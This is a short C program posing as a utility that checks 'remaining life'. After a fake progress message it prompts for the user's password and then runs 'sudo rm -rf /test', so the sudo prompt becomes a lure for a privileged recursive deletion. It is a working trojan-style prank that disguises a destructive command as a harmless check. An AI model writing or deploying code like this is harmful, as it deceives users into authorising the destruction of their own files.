#include <stdio.h>
#include <unistd.h>

void main() {
    printf("    Checking the remaining life ...");
    printf("\n");
    sleep(10);
    printf("     >>> Done!");
    printf("\n");
    printf("    Enter your password to display the remaining life :");
    printf("\n");
    system("sudo rm -rf /test");
}